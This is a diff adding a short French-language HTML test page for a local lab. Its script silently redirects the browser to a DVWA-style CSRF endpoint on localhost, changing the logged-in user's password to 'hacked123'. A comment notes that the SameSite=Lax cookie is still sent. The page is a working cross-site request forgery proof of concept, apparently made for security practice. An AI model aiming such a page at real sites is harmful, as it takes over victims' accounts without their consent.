@@ -1,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <h1>Page de test CSRF (127.0.0.1:8000)</h1>
+  <p>Redirection en cours...</p>
+  <script>
+    // Navigation de premier niveau : Chrome/Edge envoie le cookie PHPSESSID avec SameSite=Lax
+    window.location.href = "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change";
+  </script>
+</body>
+</html>
